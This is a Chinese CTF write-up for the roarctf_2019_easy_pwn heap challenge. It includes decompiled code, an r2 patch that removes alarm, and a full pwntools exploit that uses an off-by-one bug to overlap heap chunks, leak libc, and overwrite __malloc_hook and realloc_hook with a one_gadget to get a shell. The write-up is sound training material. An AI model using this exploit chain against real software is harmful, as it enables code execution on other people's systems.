# roarctf_2019_easy_pwn

[题目地址](https://buuoj.cn/challenges#roarctf_2019_easy_pwn)

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

这题和我之前做的一道很像啊，不过有个小技巧要学。

```c
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  undefined4 choice;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  setUp();
  do {
    menu();
    choice = getInput(choice);
    switch(choice) {
    default:
      puts("Wrong try again!!");
      break;
    case 1:
      create();
      break;
    case 2:
      puts("Tell me the secret about you!!");
      write();
      break;
    case 3:
      drop();
      break;
    case 4:
      show();
      break;
    case 5:
      if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
  } while( true );
}
```

菜单题。setUp函数内调用了alarm，让调试变得十分烦人。利用r2 patch掉。

```
$ r2 ./roarctf_2019_easy_pwn
[0x000009a0]> aaa   //分析程序
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x000009a0]> afl  //展示函数列表
0x000009a0    1 41           entry0
0x00000960    1 6            sym.imp.__libc_start_main
0x00000920    1 6            sym.imp.free
0x00000928    1 6            sym.imp.puts
0x00000930    1 6            sym.imp.write
0x00000938    1 6            sym.imp.__stack_chk_fail
0x00000940    1 6            sym.imp.printf
0x00000948    1 6            sym.imp.memset
0x00000950    1 6            sym.imp.alarm
0x00000958    1 6            sym.imp.read
0x00000968    1 6            sym.imp.calloc
0x00000978    1 6            sym.imp.setvbuf
0x00000980    1 6            sym.imp.__isoc99_scanf
0x00000988    1 6            sym.imp.exit
0x00000990    1 6            sym.imp.__cxa_finalize
0x000011ec   13 205          main
0x00000aa0    8 192  -> 99   entry.init0
0x00000a60    5 50           entry.fini0
0x000009d0    4 50   -> 44   fcn.000009d0
0x00000970    1 6            loc.imp.__gmon_start__
0x00000be0    7 102          fcn.00000be0
0x00000e26    9 92           fcn.00000e26
0x00000d92   10 148          fcn.00000d92
0x0000108e   10 148          fcn.0000108e
0x00000ad0    3 138          fcn.00000ad0
0x00000b5a    3 134          fcn.00000b5a
0x00000c46   14 332          fcn.00000c46
0x00000e82    8 268          fcn.00000e82
0x00000f8e    7 256          fcn.00000f8e
0x00001122    7 202          fcn.00001122
0x000008f0    3 26           sym..init
[0x000009a0]> s main  //找到main函数
[0x000011ec]> pdf   //显示汇编
            ; DATA XREF from entry0 @ 0x9bd(r)
/ 205: int main (int argc, char **argv, char **envp);
|           ; var int64_t var_8h @ rbp-0x8
|           ; var uint32_t var_ch @ rbp-0xc
|           0x000011ec      55             push rbp
|           0x000011ed      4889e5         mov rbp, rsp
|           0x000011f0      4883ec10       sub rsp, 0x10
|           0x000011f4      64488b042528.  mov rax, qword fs:[0x28]
|           0x000011fd      488945f8       mov qword [var_8h], rax
|           0x00001201      31c0           xor eax, eax
|           0x00001203      b800000000     mov eax, 0
|           0x00001208      e8c3f8ffff     call fcn.00000ad0
|           ; CODE XREF from main @ 0x12ad(x)
|       .-> 0x0000120d      b800000000     mov eax, 0
|       :   0x00001212      e843f9ffff     call fcn.00000b5a
|       :   0x00001217      8b45f4         mov eax, dword [var_ch]
|       :   0x0000121a      89c7           mov edi, eax                ; signed int64_t arg1
|       :   0x0000121c      e8bff9ffff     call fcn.00000be0
|       :   0x00001221      8945f4         mov dword [var_ch], eax
|       :   0x00001224      837df405       cmp dword [var_ch], 5
|      ,==< 0x00001228      7776           ja case.0x124c.0
|      |:   0x0000122a      8b45f4         mov eax, dword [var_ch]
|      |:   0x0000122d      488d14850000.  lea rdx, [rax*4]
|      |:   0x00001235      488d05d80100.  lea rax, [0x00001414]
|      |:   0x0000123c      8b0402         mov eax, dword [rdx + rax]
|      |:   0x0000123f      4863d0         movsxd rdx, eax
|      |:   0x00001242      488d05cb0100.  lea rax, [0x00001414]
|      |:   0x00001249      4801d0         add rax, rdx
|      |:   ;-- switch
|      |:   0x0000124c      ffe0           jmp rax                     ; switch table (6 cases) at 0x1414
|      |:   ;-- case 1:                                                ; from 0x0000124c
|      |:   ; CODE XREF from main @ 0x124c(x)
|      |:   0x0000124e      b800000000     mov eax, 0
|      |:   0x00001253      e8eef9ffff     call fcn.00000c46
|     ,===< 0x00001258      eb53           jmp 0x12ad
|     ||:   ;-- case 2:                                                ; from 0x0000124c
|     ||:   ; CODE XREF from main @ 0x124c(x)
|     ||:   0x0000125a      488d3d7f0100.  lea rdi, str.Tell_me_the_secret_about_you__ ; 0x13e0 ; "Tell me the secret about you!!" ; const char *s
|     ||:   0x00001261      e8c2f6ffff     call sym.imp.puts           ; int puts(const char *s)
|     ||:   0x00001266      b800000000     mov eax, 0
|     ||:   0x0000126b      e812fcffff     call fcn.00000e82
|    ,====< 0x00001270      eb3b           jmp 0x12ad
|    |||:   ;-- case 3:                                                ; from 0x0000124c
|    |||:   ; CODE XREF from main @ 0x124c(x)
|    |||:   0x00001272      b800000000     mov eax, 0
|    |||:   0x00001277      e812fdffff     call fcn.00000f8e
|   ,=====< 0x0000127c      eb2f           jmp 0x12ad
|   ||||:   ;-- case 4:                                                ; from 0x0000124c
|   ||||:   ; CODE XREF from main @ 0x124c(x)
|   ||||:   0x0000127e      b800000000     mov eax, 0
|   ||||:   0x00001283      e89afeffff     call fcn.00001122
|  ,======< 0x00001288      eb23           jmp 0x12ad
|  |||||:   ;-- case 5:                                                ; from 0x0000124c
|  |||||:   ; CODE XREF from main @ 0x124c(x)
|  |||||:   0x0000128a      b800000000     mov eax, 0
|  |||||:   0x0000128f      488b4df8       mov rcx, qword [var_8h]
|  |||||:   0x00001293      6448330c2528.  xor rcx, qword fs:[0x28]
| ,=======< 0x0000129c      7419           je 0x12b7
| ========< 0x0000129e      eb12           jmp 0x12b2
| ||||||:   ;-- default:                                               ; from 0x124c
| ||||||:   ; CODE XREFS from main @ 0x1228(x), 0x124c(x)
| |||||`--> 0x000012a0      488d3d580100.  lea rdi, str.Wrong_try_again__ ; 0x13ff ; "Wrong try again!!" ; const char *s
| ||||| :   0x000012a7      e87cf6ffff     call sym.imp.puts           ; int puts(const char *s)
| ||||| :   0x000012ac      90             nop
| ||||| |   ; CODE XREFS from main @ 0x1258(x), 0x1270(x), 0x127c(x), 0x1288(x)
| |````-`=< 0x000012ad      e95bffffff     jmp 0x120d
| |         ; CODE XREF from main @ 0x129e(x)
| --------> 0x000012b2      e881f6ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
| |         ; CODE XREF from main @ 0x129c(x)
| `-------> 0x000012b7      c9             leave
\           0x000012b8      c3             ret
[0x000011ec]> s fcn.00000ad0
[0x00000ad0]> pdf
            ; CALL XREF from main @ 0x1208(x)
/ 138: fcn.00000ad0 ();
|           ; var int64_t canary @ rbp-0x8
|           0x00000ad0      55             push rbp
|           0x00000ad1      4889e5         mov rbp, rsp
|           0x00000ad4      4883ec10       sub rsp, 0x10
|           0x00000ad8      64488b042528.  mov rax, qword fs:[0x28]
|           0x00000ae1      488945f8       mov qword [canary], rax
|           0x00000ae5      31c0           xor eax, eax
|           0x00000ae7      488b05421520.  mov rax, qword [obj.stdin]  ; [0x202030:8]=0
|           0x00000aee      b900000000     mov ecx, 0                  ; size_t size
|           0x00000af3      ba02000000     mov edx, 2                  ; int mode
|           0x00000af8      be00000000     mov esi, 0                  ; char *buf
|           0x00000afd      4889c7         mov rdi, rax                ; FILE*stream
|           0x00000b00      e873feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00000b05      488b05141520.  mov rax, qword [obj.stdout] ; [0x202020:8]=0
|           0x00000b0c      b900000000     mov ecx, 0                  ; size_t size
|           0x00000b11      ba02000000     mov edx, 2                  ; int mode
|           0x00000b16      be00000000     mov esi, 0                  ; char *buf
|           0x00000b1b      4889c7         mov rdi, rax                ; FILE*stream
|           0x00000b1e      e855feffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
|           0x00000b23      ba40010000     mov edx, 0x140              ; size_t n
|           0x00000b28      be00000000     mov esi, 0                  ; int c
|           0x00000b2d      488d3d0c1520.  lea rdi, [0x00202040]       ; void *s
|           0x00000b34      e80ffeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
|           0x00000b39      bf3c000000     mov edi, 0x3c               ; '<'
|           0x00000b3e      e80dfeffff     call sym.imp.alarm
|           0x00000b43      90             nop
|           0x00000b44      488b45f8       mov rax, qword [canary]
|           0x00000b48      644833042528.  xor rax, qword fs:[0x28]
|       ,=< 0x00000b51      7405           je 0xb58
|       |   0x00000b53      e8e0fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |   ; CODE XREF from fcn.00000ad0 @ 0xb51(x)
|       `-> 0x00000b58      c9             leave
\           0x00000b59      c3             ret
[0x00000ad0]> s 0x00000b3e 
[0x00000b3e]> pd 1
|           0x00000b3e      e80dfeffff     call sym.imp.alarm
[0x00000b3e]> oo+
[0x00000b3e]> wao nop
[0x00000b3e]> pd 1
|           0x00000b3e      90             nop
[0x00000b3e]> quit
```

现在调试就不会烦人了。继续看剩下的函数。

```c
uint create(void)

{
  long lVar1;
  uint currentNote;
  void *pvVar2;
  long in_FS_OFFSET;
  uint index;
  int size;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  currentNote = 0;
  index = 0;
  do {
    if (0xf < (int)index) {
LAB_00100d7c:
      if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
        return currentNote;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    currentNote = *(uint *)(&noteList + (long)(int)index * 0x10);
    if (currentNote == 0) {
      printf("size: ");
      size = getInput(size);
      currentNote = index;
      if (0 < size) {
        if (0x1000 < size) {
          size = 0x1000;
        }
        pvVar2 = calloc((long)size,1);
        if (pvVar2 == (void *)0x0) {
                    /* WARNING: Subroutine does not return */
          exit(-1);
        }
        *(undefined4 *)(&noteList + (long)(int)index * 0x10) = 1;
        *(int *)(&sizeList + (long)(int)index * 0x10) = size;
        *(void **)(&contentList + (long)(int)index * 0x10) = pvVar2;
        printf("the index of ticket is %d \n",(ulong)index);
      }
      goto LAB_00100d7c;
    }
    index = index + 1;
  } while( true );
}
```

ghidra这块反汇编出大问题，我最开始疑惑这题怎么存笔记的结构这么奇怪，有3个list。后来gdb调试了才发现实际上是这样的：

```
Note system
1. create a note
2. write note
3. drop the note
4. show the note
5. exit
choice: 1
size: 16
the index of ticket is 0 

Breakpoint 2, 0x000056229dc00d91 in ?? ()
(gdb) x/16g 94706677588032
0x56229de02040: 0x0000001000000001      0x000056229ecf12a0
0x56229de02050: 0x0000000000000000      0x0000000000000000
0x56229de02060: 0x0000000000000000      0x0000000000000000
0x56229de02070: 0x0000000000000000      0x0000000000000000
0x56229de02080: 0x0000000000000000      0x0000000000000000
0x56229de02090: 0x0000000000000000      0x0000000000000000
0x56229de020a0: 0x0000000000000000      0x0000000000000000
0x56229de020b0: 0x0000000000000000      0x0000000000000000
```

等于每个笔记是16个字节，开始8个字节中间装大小，末尾表示是否被占用；后8个字节装内容。

```c
int write(void)

{
  long lVar1;
  int index;
  undefined4 uVar2;
  long in_FS_OFFSET;
  int size;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("index: ");
  index = getInput(size);
  size = index;
  if ((-1 < index) && (index < 0x10)) {
    size = *(int *)(&noteList + (long)index * 0x10);
    if (size == 1) {
      printf("size: ");
      size = getInput(1);
      uVar2 = CalculateSize(*(undefined4 *)(&sizeList + (long)index * 0x10),size);
      if (0 < size) {
        printf("content: ");
        size = GetContent(*(undefined8 *)(&contentList + (long)index * 0x10),uVar2);
      }
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return size;
}
```

write里面出现off by one漏洞，不过绕了个圈子。

```c
int CalculateSize(int param_1,int param_2)

{
  int iVar1;
  long in_FS_OFFSET;
  
  if ((param_1 <= param_2) && (iVar1 = param_2 - param_1, param_2 = param_1, iVar1 == 10)) {
    param_2 = param_1 + 1;
  }
  if (*(long *)(in_FS_OFFSET + 0x28) == *(long *)(in_FS_OFFSET + 0x28)) {
    return param_2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

当输入的大小正好是原有大小+10时，出现off by one。

```c
long drop(void)

{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  long local_18;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("index: ");
  iVar2 = getInput((undefined4)local_18);
  local_18 = (long)iVar2;
  if ((-1 < local_18) && (local_18 < 0x10)) {
    local_18 = (long)*(int *)(&noteList + local_18 * 0x10);
    if (local_18 == 1) {
      *(undefined4 *)(&noteList + (long)iVar2 * 0x10) = 0;
      *(undefined4 *)(&sizeList + (long)iVar2 * 0x10) = 0;
      free(*(void **)(&contentList + (long)iVar2 * 0x10));
      *(undefined8 *)(&contentList + (long)iVar2 * 0x10) = 0;
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_18;
}
```

drop删除笔记，没有问题。

```c
int show(void)

{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  int local_18;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("index: ");
  iVar2 = getInput(local_18);
  local_18 = iVar2;
  if ((-1 < iVar2) && (iVar2 < 0x10)) {
    local_18 = *(int *)(&noteList + (long)iVar2 * 0x10);
    if (local_18 == 1) {
      printf("content: ");
      local_18 = FUN_0010108e(*(undefined8 *)(&contentList + (long)iVar2 * 0x10),
                              *(undefined4 *)(&sizeList + (long)iVar2 * 0x10));
    }
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_18;
}
```

展示内容，没仔细看不过肯定没啥问题。漏洞应该只有一个off by one，思路是off by one溢出修改下一个chunk的size字段后实现chunk extend and overlapping，配合unsorted bin泄露地址。getshell则是利用`__malloc_hook`。虽然我现在思路很清晰（吗？），但是调试跟不上，始终无法判断该申请多大的chunk。罢了，看[wp](https://blog.csdn.net/mcmuyanga/article/details/111307531)。

```python
from pwn import *

r=remote('node4.buuoj.cn',25736)
context.log_level="debug"

def add(size):
    r.recvuntil('choice: ')
    r.sendline('1')
    r.recvuntil('size:')
    r.sendline(str(size))

def edit(index,size,data):
    r.recvuntil('choice: ')
    r.sendline('2')
    r.recvuntil('index:')
    r.sendline(str(index))
    r.recvuntil('size:')
    r.sendline(str(size))
    r.recvuntil('content:')
    r.send(data)
 
def delete(index):
    r.recvuntil('choice: ')
    r.sendline('3')
    r.recvuntil('index:')
    r.sendline(str(index))
 
def show(index):
    r.recvuntil('choice: ')
    r.sendline('4')
    r.recvuntil('index:')
    r.sendline(str(index))  

malloc_hook=3951376
realloc_hook=542400

#gdb.attach(r,"b calloc")

add(0x18)#idx0 ,off by one 漏洞中总是这个大小
add(0x10)#idx1
add(0x90)#idx2 ，unsorted bin范围，其释放后的fd和bk可以泄露地址
add(0x10)#idx3 ，防止free后与top chunk合并

#gdb.attach(r)

edit(0,34,b'a'*0x10+p64(0x20)+p8(0xa1))#off by one ，将堆块1的size域修改为0xa1
#gdb.attach(r)

edit(2,0x80,p64(0)*14+p64(0xa0)+p64(0x21))#by pass check ，测试了一下，注释这行会得到 double free or corruption。对照大佬的图看了一下，是在伪造大小的chunk和被重叠的chunk中间构造出了一个小chunk，应该就是绕过检查的关键了
#gdb.attach(r)

delete(1)
add(0x90)#idx1 chunk overlap

edit(1,0x20,p64(0)*2+p64(0)+p64(0xa1))  #free后再申请是为了完成chunk的重叠。重叠后由于使用的是calloc，重叠部分内的chunk2的头部全部都是0了，需要手动把它按照攻击之前的方式设置回来

delete(2)	
show(1) #free后的2号堆块在chunk1的内容范围，打印1号堆块的内容就是获取其fd和bk，即main_arena + offset地址，可以算出base。

r.recvuntil("content: ")
r.recv(0x20)
libc_base=u64(r.recv(6).ljust(8,b"\x00"))-0x3c4b78  #计算程序base




add(0x80)  #又create了一个0x80的堆块，由于刚才那个0x90的堆块被chunk1重叠，因此申请到的区域在chunk1内。

edit(1,0x90,p64(0)*2+p64(0)+p64(0x71)+p64(0)*12+p64(0x70)+p64(0x21))  #在刚才create的chunk内部又做了个假chunk。0x90,p64(0)*2+p64(0)+p64(0x71)+p64(0)*12这一段都是按照刚才create的chunk的头部进行覆盖，最后p64(0x70)+p64(0x21)似乎是跟上面一样，绕检查。

delete(2) #free刚才的chunk，可能纯粹就是为了执行fastbin attack。

edit(1,0x30,p64(0)*2+p64(0)+p64(0x71)+p64(malloc_hook+libc_base-0x23)*2)  #此时我们更改的是刚才的chunk的fd和bk。根据fastbin的chunk管理方式，我们将可以分配到malloc_hook+libc_base-0x23处的chunk。


add(0x60)  #这个取出的是 delete(2) 的chunk，不是我们想要的。根据它的fd的记录（被我们修改了），下一次再申请chunk就能申请到malloc_hook+libc_base-0x23处的chunk了

add(0x60)#idx4 ，这就是malloc_hook+libc_base-0x23处的chunk，编辑它能间接编辑malloc_hook
#gdb.attach(r)

one_gadgets=[0x45216,0x4526a,0xf1147,0xf02a4]
edit(4,27,b'a'*11+p64(libc_base+one_gadgets[2])+p64(libc_base+realloc_hook+4))   #但是这次我们不能直接编辑malloc_hook，因为one_gadget全失效了。解决办法是将realloc_hook设置为选择好的one_gadget，将malloc_hook设置为realloc函数开头某一push寄存器处
add(0x60)
r.interactive()
```

新技巧是[realloc_hook调整堆栈](https://bbs.pediy.com/thread-246786-1.htm#msg_header_h1_3)使one_gadget可用。realloc函数在函数起始会检查realloc_hook的值是否为0，不为0则跳转至realloc_hook指向地址。且realloc_hook同malloc_hook相邻，可通过fastbin attack一同修改两个值。当realloc_hook不为0时，执行realloc函数时开始会有一连串的push。我们只需要把malloc_hook根据需求设置为第二个push，或者第三个，就能调整堆栈。便有了把realloc_hook设为one_gadget，malloc_hook设为realloc_hook开头push处的利用方法。

fastbin attack分配到的地址选malloc_hook+libc_base-0x23基本是共识了，因为这里正好可以利用错位使此处的假chunk size域是0x7f，够大而且符合fastbin范围。

## Flag
> flag{0ed840cf-aa84-4995-8e29-5d6f86ece66f}